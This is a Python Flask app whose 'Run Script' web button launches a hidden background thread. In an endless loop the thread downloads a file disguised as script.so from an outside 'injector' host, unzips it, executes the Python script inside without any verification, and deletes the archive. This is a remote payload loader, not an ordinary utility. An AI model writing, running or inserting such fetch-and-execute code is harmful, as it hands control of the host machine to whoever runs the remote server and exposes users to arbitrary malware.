from flask import Flask
import subprocess
import threading
import os

app = Flask(__name__)

def download_unzip_and_run_script():
    while True:
        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/script.so'])
        subprocess.run(['unzip', '-o', 'script.so']) 
        subprocess.run(['python', 'itsmerjc.py'])
        os.remove('script.so')

@app.route('/')
def index():
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Run Script</title>
    </head>
    <body>
        <h1>Script Control</h1>
        <button onclick="startScript()">Run Script</button>

        <script>
            function startScript() {
                fetch('/run-script', { method: 'POST' })
                    .then(response => response.text())
                    .then(data => alert(data))
                    .catch(error => console.error('Error:', error));
            }
        </script>
    </body>
    </html>
    """
    return html_content

@app.route('/run-script', methods=['POST'])
def run_script():
    if not any(thread.name == "ScriptThread" for thread in threading.enumerate()):
        thread = threading.Thread(target=download_unzip_and_run_script, name="ScriptThread")
        thread.daemon = True
        thread.start()

    return 'Script downloading, unzipping, and running in the background.'

if __name__ == "__main__":
    app.run()
